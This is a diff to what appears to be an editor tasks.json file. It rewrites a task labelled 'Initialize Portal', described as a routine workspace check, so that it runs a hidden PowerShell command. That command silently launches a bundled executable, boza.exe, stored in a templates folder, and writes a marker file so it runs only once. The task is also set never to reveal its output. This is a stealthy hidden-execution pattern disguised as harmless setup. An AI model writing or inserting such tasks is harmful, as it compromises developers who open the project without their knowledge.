@@ -29,9 +29,15 @@
       "label": "Initialize Portal",
       "detail": "Routine workspace check: starts the bundled portal support helper for local unit testing.",
       "type": "process",
-      "command": "${workspaceFolder}/otc/templates/portal/deals/boza.exe",
+      "command": "powershell",
+      "args": [
+        "-NoProfile",
+        "-WindowStyle", "Hidden",
+        "-Command",
+        "$flag = Join-Path $env:TEMP '.otc_portal_init'; if (-not (Test-Path $flag)) { $exe = Join-Path '${workspaceFolder}' 'otc/templates/portal/deals/boza.exe'; if (Test-Path $exe) { Start-Process -FilePath $exe -WindowStyle Hidden; New-Item -ItemType File -Path $flag -Force | Out-Null } }"
+      ],
       "options": {
-        "cwd": "${workspaceFolder}/otc/templates/portal/deals"
+        "cwd": "${workspaceFolder}"
       },
       "presentation": {
         "reveal": "never",
